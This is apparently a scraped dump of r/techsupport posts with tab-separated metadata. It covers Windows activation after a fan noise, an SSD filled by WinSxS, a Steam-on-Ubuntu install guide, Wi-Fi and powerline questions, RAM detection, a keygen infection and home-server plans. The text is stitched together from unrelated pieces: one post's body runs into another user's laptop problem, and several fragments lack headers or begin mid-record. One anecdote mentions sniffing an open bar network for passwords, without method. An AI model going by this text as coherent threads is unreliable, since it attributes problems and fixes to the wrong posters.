Reddit, do you have recommenations for a better solution than Google Apps? If so, what's awesome about the option you recommend?

1373815274.0	1ia1m0	One of the fans in my computer made an unpleasant noise, and, upon restarting, my copy of Windows is no longer genuine?	theirfour	29	7	16	"Hey /r/techsupport!

I built my computer with the help of /r/buildapc a couple of years back, and it's treated me incredibly well since then. This morning, when I turned it on, shortly after getting into Windows, one of the fans (I think) started making a loud, unpleasant whirring (loud enough that I initially thought it might be a disc skittering around in my optical drive). I shut it down immediately, let it rest, restarted it, and the sound has not since come back.

However, upon restart, Microsoft Security Essentials popped up saying that my copy of Windows wasn't genuine (it is). Googling around, it seems like that can happen when something in the hardware changes to make Windows think it's a different computer.

What's weird is that *I can't find anything that isn't working*. There's air coming out from the back of my computer, and my power supply obviously still works as my computer's able to turn on and run. I tested a graphic-intensive game (Borderlands 2), and it appears my GPU is still working. SIW says my CPU fan is still chugging along (though I haven't taken off the side of the case to officially verify that). Even my optical drive is working just fine.

Even the non-genuine Windows issue seemed to just go away like the fan noise did, as Control Panel &gt; System tells my my copy *is* genuine, and clicking the ""resolve now"" button in MSE made its non-genuine message go away (but not before it dumped me on a download page to install some MS phone home software that I opted not to use).

Anybody know what's going on? Or did my computer have some sort of temporary hiccup that's fine now? What tests can I run or things can I do to make sure everything's really fine (or identify the hidden problem)?

**Update:**

Per the advice here, I scanned the harddrive using WD's tool and it passed. I also ran the MGADiag tool which shows my Windows as licensed. My computer seems to be running normally again, so I'm wondering if it wasn't just, as someone suggested, a coincidence that the two things happened in conjunction.

I have gone through and uninstalled all apps and software that came with it, and have not installed anything or added files, and there is STILL only 10GB free on the SSD at **maximum**. I say at maximum because it fluctuates whenever the laptop is restarted... 1 hour ago I was just installing updates, then and it said that it only had 10MB of free space left. What's the deal? Seriously, how can I fix this shit? I'm uncomfortable with using a PC with less than 10GB free space on the OS's storage drive, so I don't feel good letting my friend use it either seeing as I'm the tech guy. Usually I'd google something this, but I've yielded no results, so I've resorted to the professionals...

The laptop is an MSI GE70, I can give full specs if necessary, but I don't know how they would help in this situation.

It has more than enough RAM, the hard drive has been error checked and passed with flying colours, I tried installing windows 7 to fix the issue, but one of the drivers failed to install and the laptop started doing weird things (Wireless stopped working, blue screened a few times, etc.), and it got sent back to MSI for warranty, their solution was to re install Windows 8... But that still leaves us with this retarded space issue. There is no windows.old in the hard drive.

To whoever gives a solution, thank you SO MUCH in advance.

EDIT: Did some digging:

* The ProgramData folder in C:\ takes up 10GB, all of this space is taken up by the windows folder inside.  
* The Windows folder in C:\ takes up 40GB.  
* The combined Program Files folders (x86 and x64) take up 3GB.  
* The SSD is currently sitting on 1.5GB free space.  
* 57GB is eaten up JUST FROM INSTALLING W8.

EDIT 2:  
The SSD free space fluctuates between 1.3GB and 2.1GB when the computer is idling. (All I did was sit in my computer and click refresh and free space changes.) 

EDIT 3:  
It also takes about 3-4 minutes to boot, which sounds wrong for an SSD with Windows 8, my Asus only has a HDD and W8 and it boots in about 30 seconds...

**EDIT 4:**  
Compared the problem computer with another 64 bit installation of Windows 8 which is also fully updated. It takes up 24GB, a full 16GB less than the installation on the problem computer.

EDIT 5:  
C:\Windows\WinSxS takes up 22GB of space on the problem laptop and only 13GB on my other laptop with the exact same OS running."	t5_2qioo	True

1361052160.0	18npnb	Installing Steam on Ubuntu 12.10 (A how-to) x-post from r/TF2	pumodi	26	6	12	"Hey all, I spent the good portion of last night working on installing Steam on my Ubuntu partition.

Needless to say, it was quite the process. I have come up with a How-To for installing it properly. I have to reboot my computer and email it to myself but I will come back in 20 minutes and post it here. Thought it might help some people.

EDIT:

How to Install Steam on a 64 bit version of Ubuntu 12

This process is for people who get the “Wrong Architecture i386” error or people who can't get the program to install through the software center.

I was having a tough time getting Steam to install on my linux partition but after a few hours of fennagling I managed to get it to work. I should start by saying that I am by no means a Linux expert. I figured out how to get Steam to work on my computer using the following steps and have had success with my friends who've asked for help. That being said, I can't really offer support beyond this. Most of the information I used can be found on the web. Only downside is that it is all scattered around. Just stay patient and be diligent when looking for support online.

For those of you not familiar with command line/terminal stuff, don't type the first $ sign that you see. That's just for reference in your terminal window.

Steps

1- Open terminal.

2- If you don't already have root access type this command to get root access

$ sudo bash

Ubuntu will then ask you for the administrator password. This will give you root access.

3- Use wget to download the steam.deb file. Type the following command

wget http://media.steampowered.com/client/installer/steam.deb

This downloads the installer to your home folder. Don't move it, don't touch it. EDIT: As SudosSandwich mentioned this downloads to the PWD (or Present Working Directory)

4- Install the linux packages and the nvidia-experimental-310 driver

sudo apt-get install linux-source linux-headers-generic

sudo apt-get install nvidia-experimental-310

Terminal might say it is unable to authenticate the packages and will ask you for verification to install. Type Y to continue.

EDIT:
(A friend mentioned that I left out the process for installing the ATI drivers for those not using Nvidia cards. You can install this driver from the 'Additional Hardware Drivers' dialogue in System Settings. You are installing [I]fglrx-experimental-X[/I], which, alternatively, you could install using sudo apt-get install)

This process may take a few moments.

5- This is the part that's causing the most problems with your install. We need to enable multiarch support. You are running Ubuntu in 64 bit whereas Steam has 32 bit dependencies. Multiarch allows you to run applications compiled for 32 bit computers in a 64 bit environment.

Run the following commands to get i386

sudo dpkg --add-architecture i386

sudo apt-get update

sudo apt-get -f install

6- Run dpkg to attempt a brute force install

sudo dpkg -i steam.deb

If at this point you get the “package architecture (i386) does not match system (amd64) then you did something wrong in the previous steps. If you get other errors (such as dependency errors) type the following.

sudo apt-get install -f

This will get all the dependencies that you need for steam and install them.

7- After this is done, which could take a little while, you might get a dialgoue box that pops up saying something to the effect of “Open Steam to complete installation”. If so, congrats your almost done, move to step 10. If this doesn't pop up move on to step 8.

8- Run dpkg again

sudo dpkg -i steam.deb

9- Update Steam. This is a no brainer, just let it do it's thing.

10- Install jockey-common (if it asks). If it doesn't ask then you have it installed. If it does ask then give the terminal window that pops up your admin password and say yes to any prompts. It should install clean and end with a line saying “Press return to continue”. If it does not, shut your computer down and try again. I have found any way to fix this through the terminal but restarting my computer helped for me.

11- You should now have steam installed. From this point on it should be standard Steam security affair. Have fun playing games on Linux. I would go so far as to call it...a Steam...Box :P

First-world-problem right here:


I recently bought a tablet (nexus 7) and want to have a wifi-connection in my room. The setup of my internet makes this complicated, so let me lay it out for ya:

The router (which can put out wireless and cable signal) sits in my basement, cause there's where the phone cable acces is (it's kinda a spliced cable TV line, Unitymedia Germany fyi). the walls / ceilings are VERY thick concrete, so the wifi signal at ground level is already bad, and on the first floor it's nonexistant. That's why i use devolo dlan to get a connection to my PC up there. 
Now, is there a way to get wifi in my room / at my floor level, possibly with me being able to still use cable on my main pc that's relatively cheap? 

Answers will be greatly appreciated, and I will answer further questions if you have em, in case i didnt include enough info."	t5_2qioo	True

I use it as a game server and local NAS. It has 16 RAM slots, four of which were filled when I got it (it was refurbished). The place I bought it from says it is capable of handling up to 128GB of RAM. So with the original (to me) memory, the machine had 8GB of RAM (4x2GB) and the operating system said it had 8GB of RAM. All was happy and good.

I bought 16GB of RAM (8x2GB) as an upgrade to the server (it's the exact same type, fully buffered ECC DDR2) and then the problems happened. Here are the results from my testing:

///

Original RAM: 8GB (4x2GB)

New RAM: 16GB (8x2GB)

Just the original RAM: 8GB installed, machine reads 8GB.

Just the new RAM: 16GB installed, machine reads 16GB.

Original RAM + New RAM: 24GB installed, machine reads 16GB.

Original RAM + half of new RAM: 16GB installed, will not boot.

On all occasions with the exception of the last one listed, all of the RAM was warm to the touch, whether it was recognized or not.

There were also several test runs where I moved RAM around to see if it was a motherboard problem, but that's the gist of it. The hardware should be able to run it, the operating system has a cap of 2TB (Windows Server 2008 R2 [x64]) -- I'm just kind of lost.

Little bit of information, I'm currently studying a Computing &amp; security course and on my summer break so working in a bar that advertises ""Free Wifi"" this is all well and good but during a slow shift I was thinking about the security; is the office computer secured? 

So naturally I set my iPhone up as a wireless sniffer, and just analysed the results, its a no, I have passwords for the bar for food ordering services and the like, the scary part is, our payroll is sent out from this computer. 

Now in my mind this a bad thing as anyone can come in off the street and use the Wifi, its not even password protected, I'm assuming they just set up a wireless router and set up the wifi. 

I need your help, how do I tell my manager that this is the case and can anyone give me any tips on how I would tell him to secure the computer from any prying eyes that may be in the bar, or the bars either side. 

I was thinking about them getting another router that would allow me to set up another subnet, putting the work machines (2 in total) on that subnet and having the rest of the public on the other subnet. Not sure if this is financially viable though. 

Also tips on saying that I sniffed the network.

I apologize if this is a dumb question, but I'll try to be a thorough as possible so it's easy to answer.  		24	3	16	"So we signed up with Comcast for the Performance internet package of 20Mbps internet.  However, our wireless speeds are nowhere near such.  See pictures below:

[Upstairs Speedtest](http://i.imgur.com/GNNWc.jpg?1)

[Upstairs Comcast Speedtest](http://imgur.com/LnAWn)

[Hardwired Speedtest](http://imgur.com/53Wh5)

[Downstairs Speedtest, right next to wireless router](http://imgur.com/m7Vz0)

So, the wireless is worse upstairs, that makes sense.  But it is still *horrible* right next to the router.  I had 4 bar connection when upstairs and a 5 bar connection right next to the router.  However, when hardwired we get exactly, if not better than, what we are paying for.  We live in a duplex and are friends with the people downstairs.  They let us use their internet if ours is shitty.  If I'm upstairs using their internet I get a speedtest result of **25Mbps**, that's 2 floors up (as opposed to just 1 floor up using our internet).

Our Router is Linskys E900 Wireless-N300 Router.

So, is this a Comcast problem or a Router problem?

**Edit:**  So I guess it was kinda both a Comcast problem and a Router problem.

SMART couldn't tell me what the current drive temperature was sadly. I usually use that as a barometer in these kind of situations. I ask this question because I'm about to start using this for running a vinyl cutter and adobe illustrator in a small business environment. It worries me that I may problems in the future with it, so if I have to, I will replace the hdd, but I really wouldn't like to because it's not in the budget right now.	t5_2qioo	True
1339531372.0	uyhrw	Thinking of buying a Color Laser printer, any down sides?	Sappin	24	2	32	"I am looking online for a good printer to use in college next year (apartment).

This is what I found to be the best buy.  I am thinking laser&gt;Inkjet because of how pricey ink cartridges can be.  Most laser printers are only B&amp;W however this one somehow isn't.  So... it seems to have everything I need.

The thing is, I don't know much about laser printers... so what downsides would I be looking at for a printer like this?

Thanks Guys

PraecorLoth970	27	5	29	"I have a friend who keeps saying he needs to format his hard disk and reinstall windows 7 ultimate because his laptop is too slow. I have told him to use Ubuntu in tandem with Windows, at least for the moment, to test if it works well, but he keeps insisting his computer would not be able to have two operating systems at the same time.

I have told him they are not both loaded at the same time, and, if there is enough disk space (and believe me, there is, because he has nothing besides Office and some files) there will not be a resource strain, but he does not believe me.

So I need an outside opinion. Will it really slow his computer down, or will it make no difference?"	t5_2qioo	True

1336484723.0	tcwod	Howto: Start Windows without any 3rd party services or startup items	pause1	30	8	14	"Maybe I'm the last one on earth to have discovered this, but today I stumbled over an MS article explaining how to start your Windows (Vista or 7) machine with only the default services and startup items.

This is great for troubleshooting purposes when you want to rule out potential problems caused by any 3rd party programs.

In short, here's how:

1. Start msconfig.exe
2. General tab: Select **Selective startup** and uncheck **Load startup items**.
3. Services tab: Check **Hide all Microsoft services** then uncheck everything in the remaining list.
4. OK and reboot.

Again, sorry if this is a repost or old news (I searched but found nothing in old threads), hopefully it will make life easier for someone.

1335709528.0	sy5wl	Well this is embarrassing. Keygen just screwed my whole computer.	ground0	26	5	41	"[I kinda feel like an idiot now but here it goes: I was wanting to use keygen for Adobe Flash. So as any man would do, I went to pirate bay and downloaded the keygen for it, not the actual program. I knew this was going to be a piece of cake since I've used Keygen before, but once I opened up the .exe file for the Flash keygen, AVG thought it was a trojan. I ignored it, knowing that in fact it wasn't a trojan (or was it?). The prompt asked me what program I wanted to open it with, so I clicked browse and selected Keygen. After screwing around with Keygen for a bit I noticed that all of the icons for my shortcuts on my desktop turned into the keygen logo. When I click on a shortcut, it will take me to Keygen instead, even though the properties say the shortcuts lead to the right path. ""No problem, Keygen probably just set itself as the default program for everything."" I go into the control panel and see that all of the programs have the right defaults... So I restart my computer, boot it back up, and keygen opened itself about 5 times before the desktop even loaded. I knew because of the annoying music. Now nothing will open except very specific stuff that doesn't help me. Even AVG won't open and Keygen will just pop up instead. I managed to get on Firefox by finding a bookmark I saved on my comp and type this message. So does anyone know how to fix this whole thing? I googled several different things and I feel like I am the only person dealing with this. May I mention that even Command Prompt wont open, so I can't do anything with that. There is no ""open with..."" when I right click stuff too.](/solved)

EDIT: Everything is back to normal. I'd like to thank nandryshak and tito13kfm for the help. I will download Avast! and make sure the virus, if it was a virus, is still here.

1334072286.0	s2njs	Benefits of a home server?	MRxPifko	26	2	53	"Hey guys. Thinking about building myself a home server in the next couple months and was hoping I could pick your brains on a few things. I'm going to build a home server with the initial intent of having a place where I can access my data from any computer in the house, or online from my girlfriend's house. So it's main function is going to be a file storage server, but that alone doesn't seem like enough of a reason to dish out the cash to build this. 

* Is there any reason why I couldn't/shouldn't use my Server as an HTPC as well? [Turns out no, there's not]
* Planning on running Windows Server 2008, but I'm used to dealing with it in a domain environment. Is it any more/less complicated not setting it up that way? Do I lose any functionality by not making it a domain controller? [No, but WHS 2011 is going to perform better for what I want it for]
* I've never thought about having my own email exchange server before; can it do that as well as be a HTPC &amp; File Storage server? Should I look into VMWare at that point? [Yes, and I'm probably going to try that out!]
* Is there anything in general I should know about having a Home Server?
* Can I use it as a L4D/CoD4/Minecraft host server? [Decided against this now]

I know these are a lot of random questions, and if you can only answer one question that's better than nothing :p I'm sure I'll end up figuring all of this out myself when I end up building it and trying it out, but the more knowledge I have going into it the better.

Thank you kindly!

[UPDATE:] Okay, I've pretty much decided on going with WHS 2011. The homegroup functionality seems to have everything I need and more. Any suggestions for power-friendly components/builds? I'd like to keep it on 24x7, but am concerned about my energy bill.

1326969150.0	on3tz	Best way to extend wired connection throughout big house?	simuk	22	2	32	"Hi all, 

I am based in the UK and am currently on 100mb connection from Virgin (recently upgraded from 50mb as was very happy with the service). 

Having upgraded I have noticed that the max wireless download speed from speedtest.net is around 60mb (standing right next to the hub). When wired in my laptop gets 100mb which is obviously brilliant. Perhaps the laptop cannot receive at any higher than 60mbs?

The majority of my internet use is upstairs in my office which is far enough away to make wireless no longer feasible, especially if I want good speeds. 

I am currently using this: http://www.amazon.co.uk/gp/product/B003L78F6U the D-Link DHP-307AV/B 200 MBPS PowerLine Homeplug AV Network Starter Kit

Speeds will be around 30mb/s in my office using this adaptor. 

Are there any other methods for extending the wired connection to my office? Not overly bothered about the price of this as it's important to me that I have the best internet possible. 

Thanks for any advice.
